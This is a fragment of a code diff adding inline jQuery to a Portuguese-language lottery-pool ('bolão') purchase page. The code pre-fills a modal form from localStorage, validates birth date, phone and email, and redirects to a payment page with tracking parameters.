+        if (partes.length === 3) {
+            const dia = partes[0].padStart(2, '0');
+            const mes = partes[1].padStart(2, '0');
+            const ano = partes[2];
+            return `${ano}-${mes}-${dia}`;
+        }
+    }
+    // Se a data vier no formato yyyy-mm-dd, retorna como está
+    if (data.includes('-')) {
+        return data;
+    }
+    // Se não conseguir formatar, retorna vazio
+    return '';
+}
+
+$(document).ready(function() {
+    // Quando o botão "GARANTIR BOLÃO" for clicado, abrir o modal com formulário
+    $(".open-modal").click(function(event) {
+        event.preventDefault();
+        
+        // Armazena o amount e bolao do produto clicado
+        currentAmount = $(this).data('amount');
+        currentBolao = $(this).data('bolao');
+        
+        const nomeCpf = localStorage.getItem('nome_cpf');
+        const dataNasc = localStorage.getItem('data_nasc');
+        
+        if (nomeCpf) {
+            $("#userName").val(nomeCpf);
+        } else {
+            $("#userName").val('Nome não encontrado');
+        }
+        
+        if (dataNasc) {
+            // Formata a data se necessário (assumindo que vem no formato dd/mm/yyyy)
+            const dataFormatada = formatarDataParaInput(dataNasc);
+            $("#userBirthDate").val(dataFormatada);
+        } else {
+            $("#userBirthDate").val('');
+        }
+        
+        // Limpa os outros campos
+        $("#userPhone").val('');
+        $("#userEmail").val('');
+        
+        // Abre o modal
+        $("#userDataModal").fadeIn();
+    });
+
+    // Quando o usuário clicar no "X", fechar o modal
+    $("#closeUserModal").click(function() {
+        $("#userDataModal").fadeOut();
+    });
+
+    // Quando o usuário clicar fora do modal, fechá-lo
+    $(window).click(function(event) {
+        if ($(event.target).is("#userDataModal")) {
+            $("#userDataModal").fadeOut();
+        }
+    });
+    
+    // Formatação automática do telefone enquanto digita
+    $("#userPhone").on('input', function() {
+        formatPhone(this);
+    });
+    
+    // Quando o formulário for enviado
+    $("#userDataForm").submit(function(event) {
+        event.preventDefault();
+        
+        // Coleta os dados do formulário
+        const birthDate = $("#userBirthDate").val();
+        const phone = $("#userPhone").val();
+        const email = $("#userEmail").val();
+        
+        // Validação básica - verifica se todos os campos estão preenchidos
+        if (!birthDate || !phone || !email) {
+            alert('Por favor, preencha todos os campos!');
+            return;
+        }
+        
+        // Validação de email
+        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        if (!emailRegex.test(email)) {
+            alert('Por favor, insira um e-mail válido!');
+            return;
+        }
+        
+        // Validação de telefone (deve ter pelo menos 10 dígitos)
+        const phoneDigits = phone.replace(/\D/g, '');
+        if (phoneDigits.length < 10) {
+            alert('Por favor, insira um telefone válido com DDD!');
+            return;
+        }
+        
+        // Captura os parâmetros UTM da URL atual
+        const urlParams = getUrlParams();
+        
+        // Constrói a URL de pagamento com todos os parâmetros
+        const paymentUrl = `pagar.html?amount=${currentAmount}&bolao=${currentBolao}&utm_source=${urlParams.utm_source}&utm_campaign=${urlParams.utm_campaign}&utm_medium=${urlParams.utm_medium}&utm_content=${urlParams.utm_content}&utm_term=${urlParams.utm_term}&xcod=${urlParams.xcod}`;
+        
+        // Redireciona para a página de pagamento
+        window.location.href = paymentUrl;
+    });
+});
+</script>
+
+
+
+</body>
+</html>
